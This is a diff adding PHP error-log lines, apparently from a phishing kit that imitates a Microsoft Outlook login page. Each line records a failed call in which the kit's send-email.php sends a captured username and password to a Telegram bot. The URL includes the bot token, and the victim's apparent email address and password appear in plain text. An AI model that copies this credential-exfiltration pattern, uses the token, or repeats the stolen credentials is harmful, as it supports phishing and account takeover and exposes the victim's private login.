@@ -1,0 +1,4 @@
+[29-Aug-2024 22:11:35 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot7404595804:AAGLE2DSIFR0om14aoPECPucVhB43eg5J0o/sendMessage?chat_id=dsaintbot&amp;text=Username%3A+donlykinanki%40gmail.com%0APassword%3A+47373833): Failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request
+ in /home/uscisbi1/public_html/login.live.com-outlook.123955543/send-email.php on line 19
+[29-Aug-2024 22:11:36 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot7404595804:AAGLE2DSIFR0om14aoPECPucVhB43eg5J0o/sendMessage?chat_id=dsaintbot&amp;text=Username%3A+donlykinanki%40gmail.com%0APassword%3A+47373833): Failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request
+ in /home/uscisbi1/public_html/login.live.com-outlook.123955543/send-email.php on line 19
